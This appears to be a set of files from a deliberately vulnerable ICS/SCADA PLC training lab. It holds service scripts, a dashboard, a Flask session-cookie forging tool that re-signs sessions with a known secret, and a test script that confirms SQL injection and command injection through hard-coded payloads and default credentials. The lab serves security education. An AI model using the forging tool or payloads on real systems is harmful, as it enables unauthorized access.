                            data.security_status === 'CRITICAL' ? 'status-critical' : 'status-ok';

                        document.getElementById('plc-health').textContent = data.plc_health;
                        document.getElementById('alerts').textContent = data.total_alerts;
                        document.getElementById('uptime').textContent =
                            Math.floor(data.uptime_seconds / 60) + ' minutes';

                        // Update issues
                        const issuesDiv = document.getElementById('issues');
                        if (data.issues && data.issues.length > 0) {
                            issuesDiv.innerHTML = data.issues.map(i =>
                                '<div class="alert">âš ï¸ ' + i + '</div>'
                            ).join('');
                        } else {
                            issuesDiv.innerHTML = '<div class="status-ok">âœ“ No issues detected</div>';
                        }
                    });
            }

            setInterval(updateDashboard, 2000);
            updateDashboard();
        </script>
    </head>
    <body>
        <div class="header">
            <h1>ðŸ­ ICS SYSTEM MONITOR</h1>
            <p>Real-time monitoring of industrial control systems</p>
        </div>

        <div class="panel">
            <h2>ðŸ›¡ï¸ Security Status</h2>
            <div class="metric">Status: <span id="status" class="status-ok">NORMAL</span></div>
            <div class="metric">Total Alerts: <span id="alerts">0</span></div>
            <div class="metric">Uptime: <span id="uptime">0 minutes</span></div>
        </div>

        <div class="panel">
            <h2>ðŸ­ PLC Health</h2>
            <div class="metric">Healthy PLCs: <span id="plc-health">0/0</span></div>
        </div>

        <div class="panel">
            <h2>âš ï¸ Active Issues</h2>
            <div id="issues">
                <div class="status-ok">âœ“ No issues detected</div>
            </div>
        </div>

        <div class="panel">
            <p style="color: #666; font-size: 12px;">
                Dashboard auto-refreshes every 2 seconds<br>
                For detailed logs, check console output
            </p>
        </div>
    </body>
    </html>
    '''

    @app.route('/')
    def dashboard():
        return render_template_string(HTML_TEMPLATE)

    @app.route('/api/health')
    def api_health():
        return jsonify(monitor.get_health_summary())

    # Start monitor
    monitor.start()

    print("\nðŸŒ Web Dashboard: http://localhost:5999")
    app.run(host='0.0.0.0', port=5999, debug=False)


if __name__ == '__main__':
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == '--web':
        # Start web dashboard
        create_monitoring_dashboard_web()
    else:
        # Start console monitor
        monitor = SystemMonitor()
        monitor.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping monitor...")
            monitor.stop()



================================================================================
FILE: scripts/flask_session_tool.py
================================================================================
import json
import hashlib
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature, BadSignature
from flask.sessions import TaggedJSONSerializer

# --- Configuration ---
# The secret key found from the /debug endpoint
SECRET_KEY = "insecure-secret-key-12345"

# The session cookie captured after logging in as admin/admin
ADMIN_SESSION_COOKIE = (
    ".eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0xRsjKEsPMScxHStQBzLw-T.aSvABQ.mMf9ZaH1M_IkhkBqKnU3XnzB_Ck"
)

# --- Helper Functions ---
def get_serializer(secret_key: str):
    """Returns the URLSafeTimedSerializer configured for Flask sessions."""
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    return URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',  # Default salt for Flask sessions
        serializer=serializer,
        signer_kwargs=signer_kwargs
    )

def decode_flask_session_cookie(cookie_string: str, secret_key: str) -> dict:
    """Decodes a Flask session cookie string back into a dictionary."""
    s = get_serializer(secret_key)
    try:
        decoded_data = s.loads(cookie_string)
        return decoded_data
    except (BadTimeSignature, BadSignature) as e:
        print(f"Error decoding cookie: {e}")
        return {}
    except Exception as e:
        print(f"An unexpected error occurred during decoding: {e}")
        return {}

def encode_flask_session_cookie(data: dict, secret_key: str) -> str:
    """Encodes a dictionary into a Flask session cookie string."""
    s = get_serializer(secret_key)
    return s.dumps(data)

# --- Main Logic ---
if __name__ == "__main__":
    print(f"--- Decoding Admin Session Cookie ---")
    decoded_admin_data = decode_flask_session_cookie(ADMIN_SESSION_COOKIE, SECRET_KEY)
    if decoded_admin_data:
        print(f"Decoded Admin Session Data: {json.dumps(decoded_admin_data, indent=2)}")

        # --- Forging a Session (Example: if we wanted to change a user's role) ---
        # In this case, we already have an admin cookie, so we'll just re-encode it
        # to demonstrate the process. If we had a guest cookie, we would modify
        # 'role' to 'admin' here.

        # Example modification (if decoded_admin_data was from a guest user):
        # if 'role' in decoded_admin_data and decoded_admin_data['role'] != 'admin':
        #     decoded_admin_data['role'] = 'admin'
        #     print("\n--- Modified session data to 'admin' role ---")

        print("\n--- Re-encoding (Forging) the Session Cookie ---")
        forged_session_cookie = encode_flask_session_cookie(decoded_admin_data, SECRET_KEY)
        print(f"Forged Session Cookie: {forged_session_cookie}")

        # --- Verification (Optional: Decode the forged cookie to ensure it's correct) ---
        print("\n--- Verifying Forged Cookie ---")
        verified_data = decode_flask_session_cookie(forged_session_cookie, SECRET_KEY)
        print(f"Verified Decoded Data: {json.dumps(verified_data, indent=2)}")

    else:
        print("Failed to decode the admin session cookie.")



================================================================================
FILE: scripts/start.py
================================================================================
#!/usr/bin/env python3
"""
Startup script for Vulnerable PLC Simulator
Starts both the web interface and Modbus TCP server
"""

import subprocess
import sys
import time
from multiprocessing import Process

def start_modbus_server():
    """Start Modbus TCP server"""
    subprocess.run([sys.executable, 'modbus_server.py'])

def start_web_server():
    """Start Flask web server"""
    subprocess.run([sys.executable, 'app.py'])

def main():
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  Vulnerable PLC Simulator v1.0                            â•‘
    â•‘  FOR SECURITY TESTING AND EDUCATION ONLY                  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Starting services...
    """)

    # Start Modbus server in background
    modbus_process = Process(target=start_modbus_server)
    modbus_process.start()

    time.sleep(2)  # Give Modbus server time to start

    # Start web server in foreground
    web_process = Process(target=start_web_server)
    web_process.start()

    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  Services Started Successfully                            â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Web Interface:  http://localhost:5000
    Modbus TCP:     localhost:5502

    Default Credentials:
      admin / admin
      operator / operator123
      guest / guest

    Press Ctrl+C to stop all services
    """)

    try:
        modbus_process.join()
        web_process.join()
    except KeyboardInterrupt:
        print("\n\nShutting down...")
        modbus_process.terminate()
        web_process.terminate()
        modbus_process.join()
        web_process.join()
        print("All services stopped.")

if __name__ == '__main__':
    main()



================================================================================
FILE: scripts/test_environment.py
================================================================================
#!/usr/bin/env python3
"""
Test script to verify the vulnerable PLC environment is working
"""

import requests
import time
import sys

def test_web_interface():
    """Test web interface"""
    print("[1/5] Testing web interface...")
    try:
        response = requests.get('http://localhost:5000', timeout=5)
        if response.status_code == 200:
            print("  âœ“ Web interface is accessible")
            return True
        else:
            print(f"  âœ— Web interface returned status {response.status_code}")
            return False
    except Exception as e:
        print(f"  âœ— Cannot connect to web interface: {e}")
        return False

def test_login():
    """Test login functionality"""
    print("[2/5] Testing login...")
    try:
        session = requests.Session()
        response = session.post('http://localhost:5000/login',
                               data={'username': 'admin', 'password': 'admin'},
                               timeout=5,
                               allow_redirects=False)
        if response.status_code in [200, 302]:
            print("  âœ“ Login successful")
            return True, session
        else:
            print(f"  âœ— Login failed with status {response.status_code}")
            return False, None
    except Exception as e:
        print(f"  âœ— Login test failed: {e}")
        return False, None

def test_sql_injection():
    """Test SQL injection vulnerability"""
    print("[3/5] Testing SQL injection vulnerability...")
    try:
        session = requests.Session()
        response = session.post('http://localhost:5000/login',
                               data={'username': "admin' OR '1'='1", 'password': 'anything'},
                               timeout=5,
                               allow_redirects=False)
        if response.status_code in [200, 302]:
            print("  âœ“ SQL injection vulnerability confirmed")
            return True
        else:
            print(f"  âœ— SQL injection test returned status {response.status_code}")
            return False
    except Exception as e:
        print(f"  âœ— SQL injection test failed: {e}")
        return False

def test_modbus():
    """Test Modbus TCP server"""
    print("[4/5] Testing Modbus TCP server...")
    try:
        from pymodbus.client.sync import ModbusTcpClient
        client = ModbusTcpClient('localhost', port=5502, timeout=5)
        if client.connect():
            result = client.read_holding_registers(0, 5)
            if result:
                print(f"  âœ“ Modbus server responding (registers: {result.registers})")
                client.close()
                return True
            else:
                print("  âœ— Modbus read failed")
                client.close()
                return False
        else:
            print("  âœ— Cannot connect to Modbus server")
            return False
    except ImportError:
        print("  âš  pymodbus not installed (optional for web testing)")
        return True
    except Exception as e:
        print(f"  âœ— Modbus test failed: {e}")
        return False

def test_command_injection(session):
    """Test command injection vulnerability"""
    print("[5/5] Testing command injection...")
    if not session:
        print("  âš  Skipped (no authenticated session)")
        return True

    try:
        response = session.post('http://localhost:5000/admin/exec',
                               data={'command': 'echo "test"'},
                               timeout=5)
        data = response.json()
        if 'output' in data and 'test' in data['output']:
            print("  âœ“ Command injection vulnerability confirmed")
            return True
        else:
            print("  âœ— Command injection test failed")
            return False
    except Exception as e:
        print(f"  âœ— Command injection test failed: {e}")
        return False

def main():
    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  Vulnerable PLC Environment Test                          â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Testing all components...
    """)

    results = []

    # Test web interface
    results.append(test_web_interface())

    # Test login
    login_ok, session = test_login()
    results.append(login_ok)

    # Test SQL injection
    results.append(test_sql_injection())

    # Test Modbus
    results.append(test_modbus())

    # Test command injection
    results.append(test_command_injection(session))

    # Summary
    print("\n" + "="*60)
    passed = sum(results)
    total = len(results)

    if passed == total:
        print(f"âœ“ ALL TESTS PASSED ({passed}/{total})")
        print("\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
        print("â•‘  Environment is ready for security testing!               â•‘")
        print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
        print("\nWeb Interface: http://localhost:5000")
        print("Modbus TCP:    localhost:5502")
        print("\nDefault credentials: admin / admin")
        return 0
    else:
        print(f"âœ— SOME TESTS FAILED ({passed}/{total} passed)")
        print("\nPlease ensure the environment is running:")
        print("  python start.py")
        return 1

if __name__ == '__main__':
    sys.exit(main())



================================================================================
FILE: scripts/install.sh
================================================================================
#!/bin/bash
# Vulnerable PLC - Installation Script
# Creates symlink so 'vuln-plc' command is available system-wide

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VULN_PLC_SCRIPT="$SCRIPT_DIR/vuln-plc"
INSTALL_PATH="/usr/local/bin/vuln-plc"

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${BLUE}â•‘  Vulnerable PLC - Installation                            â•‘${NC}"
echo -e "${BLUE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo ""

# Check if vuln-plc script exists
if [ ! -f "$VULN_PLC_SCRIPT" ]; then
    echo -e "${RED}Error: vuln-plc script not found at $VULN_PLC_SCRIPT${NC}"
    exit 1
fi

# Make sure script is executable
chmod +x "$VULN_PLC_SCRIPT"
chmod +x "$SCRIPT_DIR/start_all.sh"
chmod +x "$SCRIPT_DIR/stop_all.sh"
chmod +x "$SCRIPT_DIR/status.sh"

echo -e "${YELLOW}Creating system-wide command...${NC}"

# Check if /usr/local/bin exists
if [ ! -d "/usr/local/bin" ]; then
    echo -e "${RED}Error: /usr/local/bin directory not found${NC}"
    exit 1
fi

# Remove existing symlink if present
if [ -L "$INSTALL_PATH" ]; then
    echo -e "${YELLOW}Removing existing symlink...${NC}"
    sudo rm "$INSTALL_PATH"
fi

# Create symlink
if sudo ln -s "$VULN_PLC_SCRIPT" "$INSTALL_PATH"; then
    echo -e "${GREEN}âœ“ Symlink created: $INSTALL_PATH -> $VULN_PLC_SCRIPT${NC}"
else
    echo -e "${RED}Error: Failed to create symlink${NC}"
    echo -e "${YELLOW}You may need sudo privileges${NC}"
    exit 1
fi

echo ""
echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${GREEN}  Installation Complete!${NC}"
echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo ""
echo -e "${BLUE}You can now use the 'vuln-plc' command from anywhere:${NC}"
echo ""
echo -e "  ${YELLOW}vuln-plc start${NC}      Start all services"
echo -e "  ${YELLOW}vuln-plc stop${NC}       Stop all services"
echo -e "  ${YELLOW}vuln-plc status${NC}     Show service status"
echo -e "  ${YELLOW}vuln-plc restart${NC}    Restart all services"
echo -e "  ${YELLOW}vuln-plc logs${NC}       Follow all logs"
echo -e "  ${YELLOW}vuln-plc help${NC}       Show help"
echo ""
echo -e "${BLUE}Get started:${NC}"
echo -e "  ${YELLOW}vuln-plc start${NC}"
echo ""



================================================================================
FILE: scripts/start_all.sh
================================================================================
#!/bin/bash
# Vulnerable PLC - Master Startup Script
# Starts all PLCs, Historian, and Network Simulator

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$PROJECT_ROOT"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${BLUE}â•‘  Vulnerable PLC - ICS/SCADA Security Training Lab        â•‘${NC}"
echo -e "${BLUE}â•‘  Starting All Services...                                 â•‘${NC}"
echo -e "${BLUE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo ""

# Create logs directory
mkdir -p logs

# Function to start a service
start_service() {
    local name=$1
    local command=$2
    local logfile=$3

    echo -e "${YELLOW}Starting $name...${NC}"
    nohup python3 $command > logs/$logfile 2>&1 &
    local pid=$!
    echo $pid > logs/${name}.pid

    # Wait a moment and check if process is still running
    sleep 1
    if ps -p $pid > /dev/null 2>&1; then
        echo -e "${GREEN}âœ“ $name started (PID: $pid)${NC}"
    else
        echo -e "${RED}âœ— $name failed to start${NC}"
    fi
}

# Stop any existing processes
echo -e "${YELLOW}Checking for existing processes...${NC}"
if [ -d "logs" ]; then
    for pidfile in logs/*.pid; do
        if [ -f "$pidfile" ]; then
            pid=$(cat "$pidfile")
            if ps -p $pid > /dev/null 2>&1; then
                echo -e "${YELLOW}Stopping existing process $pid...${NC}"
                kill $pid 2>/dev/null
            fi
            rm "$pidfile"
        fi
    done
fi

echo ""
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${BLUE}  Starting PLC Systems${NC}"
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

# Start PLC-1 (Tank Control)
start_service "PLC1-Modbus" "core/modbus_server.py" "plc1_modbus.log"
start_service "PLC1-Web" "core/app.py" "plc1_web.log"

# Start PLC-2 (Pressure Control)
start_service "PLC2-Modbus" "core/modbus_server2.py" "plc2_modbus.log"
start_service "PLC2-Web" "core/plc2_pressure.py" "plc2_web.log"

# Start PLC-3 (Temperature Control)
start_service "PLC3-Modbus" "core/modbus_server3.py" "plc3_modbus.log"
start_service "PLC3-Web" "core/plc3_temperature.py" "plc3_web.log"

# Start PLC-4 (Safety/ESD)
start_service "PLC4-Modbus" "core/modbus_server4.py" "plc4_modbus.log"
start_service "PLC4-Web" "core/plc4_safety.py" "plc4_web.log"

echo ""
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${BLUE}  Starting Infrastructure Services${NC}"
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

# Start Historian
start_service "Historian" "core/historian.py" "historian.log"

# Start Network Simulator
start_service "NetworkSim" "monitoring/network_simulator.py" "network.log"

# Start Physical Process Simulator
start_service "PhysicalProcess" "core/physical_process.py" "physical_process.log"

# Start System Monitor (Web Dashboard)
start_service "SystemMonitor" "monitoring/system_monitor.py --web" "system_monitor.log"

# Start HMI Server (Visual SCADA Interface)
start_service "HMI-Server" "core/hmi_server.py" "hmi.log"

echo ""
echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${GREEN}  All Services Started Successfully!${NC}"
echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo ""
echo -e "${BLUE}Web Interfaces:${NC}"
echo -e "  PLC-1 (Tank Control):      ${YELLOW}http://localhost:5000${NC}  (admin/admin)"
echo -e "  PLC-2 (Pressure System):   ${YELLOW}http://localhost:5011${NC}  (engineer/plc2pass)"
echo -e "  PLC-3 (Temperature):       ${YELLOW}http://localhost:5012${NC}  (engineer/temp123)"
echo -e "  PLC-4 (Safety/ESD):        ${YELLOW}http://localhost:5013${NC}  (safety_eng/safe123)"
echo -e "  Historian:                 ${YELLOW}http://localhost:8888${NC}  (historian/data123)"
echo -e "  System Monitor:            ${YELLOW}http://localhost:5999${NC}  (realtime dashboard)"
echo -e "  HMI Interface:             ${YELLOW}http://localhost:8000${NC}  (SCADA visualization)"
echo ""
echo -e "${BLUE}Modbus TCP Endpoints:${NC}"
echo -e "  PLC-1: ${YELLOW}localhost:5502${NC}"
echo -e "  PLC-2: ${YELLOW}localhost:5503${NC}"
echo -e "  PLC-3: ${YELLOW}localhost:5504${NC}"
echo -e "  PLC-4: ${YELLOW}localhost:5505${NC}"
echo ""
echo -e "${BLUE}Logs:${NC} ${YELLOW}tail -f logs/*.log${NC}"
echo -e "${BLUE}Stop All:${NC} ${YELLOW}./stop_all.sh${NC}"
echo -e "${BLUE}Status:${NC} ${YELLOW}./status.sh${NC}"
echo ""
echo -e "${RED}âš ï¸  WARNING: This is an INTENTIONALLY VULNERABLE system${NC}"
echo -e "${RED}    Use ONLY in isolated lab environments!${NC}"
echo ""



================================================================================
FILE: scripts/status.sh
================================================================================
#!/bin/bash
# Vulnerable PLC - Status Check Script
# Shows which services are currently running

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${BLUE}â•‘  Vulnerable PLC - Service Status                          â•‘${NC}"
echo -e "${BLUE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo ""

# Function to check service status
check_service() {
    local name=$1
    local pidfile="logs/${name}.pid"
    local port=$2

    if [ -f "$pidfile" ]; then
        pid=$(cat "$pidfile")

        if ps -p $pid > /dev/null 2>&1; then
            echo -e "${GREEN}âœ“${NC} $name (PID: $pid) - ${GREEN}RUNNING${NC}"

            # Check port if provided
            if [ ! -z "$port" ]; then
                if netstat -tuln 2>/dev/null | grep -q ":$port " || ss -tuln 2>/dev/null | grep -q ":$port "; then
                    echo -e "  â””â”€ Port $port: ${GREEN}LISTENING${NC}"
                else
                    echo -e "  â””â”€ Port $port: ${RED}NOT LISTENING${NC}"
                fi
            fi
        else
            echo -e "${RED}âœ—${NC} $name (PID: $pid) - ${RED}DEAD (stale PID file)${NC}"
        fi
    else
        echo -e "${RED}âœ—${NC} $name - ${RED}NOT RUNNING${NC}"
    fi
}

# Check if logs directory exists
if [ ! -d "logs" ]; then
    echo -e "${YELLOW}No services appear to have been started yet${NC}"
    echo -e "${YELLOW}Run: ${BLUE}./start_all.sh${NC}"
    echo ""
    exit 0
fi

echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${BLUE}  PLC Systems${NC}"
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

check_service "PLC1-Modbus" 5502
check_service "PLC1-Web" 5000
echo ""
check_service "PLC2-Modbus" 5503
check_service "PLC2-Web" 5011
echo ""
check_service "PLC3-Modbus" 5504
check_service "PLC3-Web" 5012
echo ""
check_service "PLC4-Modbus" 5505
check_service "PLC4-Web" 5013

echo ""
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${BLUE}  Infrastructure Services${NC}"
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

check_service "Historian" 8888
check_service "NetworkSim"

echo ""
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${BLUE}  Quick Links${NC}"
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

# Count running services
running_count=0
total_count=10

for pidfile in logs/*.pid; do
    if [ -f "$pidfile" ]; then
        pid=$(cat "$pidfile")
        if ps -p $pid > /dev/null 2>&1; then
            ((running_count++))
        fi
    fi
done

echo -e "Services Running: ${GREEN}$running_count${NC} / $total_count"
echo ""

if [ $running_count -gt 0 ]; then
    echo -e "${BLUE}Web Interfaces:${NC}"
    echo -e "  PLC-1: ${YELLOW}http://localhost:5000${NC}"
    echo -e "  PLC-2: ${YELLOW}http://localhost:5011${NC}"
    echo -e "  PLC-3: ${YELLOW}http://localhost:5012${NC}"
    echo -e "  PLC-4: ${YELLOW}http://localhost:5013${NC}"
    echo -e "  Historian: ${YELLOW}http://localhost:8888${NC}"
    echo ""
    echo -e "${BLUE}Logs:${NC}"
    echo -e "  ${YELLOW}tail -f logs/*.log${NC}"
    echo ""
else
    echo -e "${YELLOW}No services running. Start with: ${BLUE}./start_all.sh${NC}"
    echo ""
fi



================================================================================
FILE: scripts/stop_all.sh
================================================================================
#!/bin/bash
# Vulnerable PLC - Master Stop Script
# Stops all running PLCs, Historian, and Network Simulator

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$PROJECT_ROOT"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
echo -e "${BLUE}â•‘  Vulnerable PLC - Stopping All Services...                â•‘${NC}"
echo -e "${BLUE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo ""

# Function to stop a service
stop_service() {
    local name=$1
    local pidfile="logs/${name}.pid"

    if [ -f "$pidfile" ]; then
        pid=$(cat "$pidfile")

        if ps -p $pid > /dev/null 2>&1; then
            echo -e "${YELLOW}Stopping $name (PID: $pid)...${NC}"
            kill $pid 2>/dev/null
            sleep 1

            # Force kill if still running
            if ps -p $pid > /dev/null 2>&1; then
                echo -e "${YELLOW}Force stopping $name...${NC}"
                kill -9 $pid 2>/dev/null
            fi

            echo -e "${GREEN}âœ“ $name stopped${NC}"
        else
            echo -e "${YELLOW}âœ“ $name not running${NC}"
        fi

        rm "$pidfile"
    else
        echo -e "${YELLOW}âœ“ $name (no PID file found)${NC}"
    fi
}

# Check if logs directory exists
if [ ! -d "logs" ]; then
    echo -e "${YELLOW}No services appear to be running (logs directory not found)${NC}"
    exit 0
fi

echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
echo -e "${BLUE}  Stopping PLC Systems${NC}"
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

stop_service "PLC1-Modbus"
stop_service "PLC1-Web"
stop_service "PLC2-Modbus"
stop_service "PLC2-Web"
stop_service "PLC3-Modbus"
stop_service "PLC3-Web"
stop_service "PLC4-Modbus"
stop_service "PLC4-Web"

echo ""
echo -e "${BLUE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
